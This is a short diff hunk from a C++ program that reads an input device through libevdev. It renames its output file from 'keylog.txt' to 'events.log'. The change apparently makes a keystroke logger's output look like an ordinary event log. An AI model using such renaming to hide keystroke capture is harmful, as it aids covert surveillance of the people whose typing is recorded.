@@ -26,9 +26,9 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
-    std::ofstream logfile("keylog.txt", std::ios::app);
+    std::ofstream logfile("events.log", std::ios::app);
     if (!logfile.is_open()) {
-        std::cerr << "Failed to open keylog.txt for writing." << std::endl;
+        std::cerr << "Failed to open events.log for writing." << std::endl;
         libevdev_free(dev);
         close(fd);
         return 1;
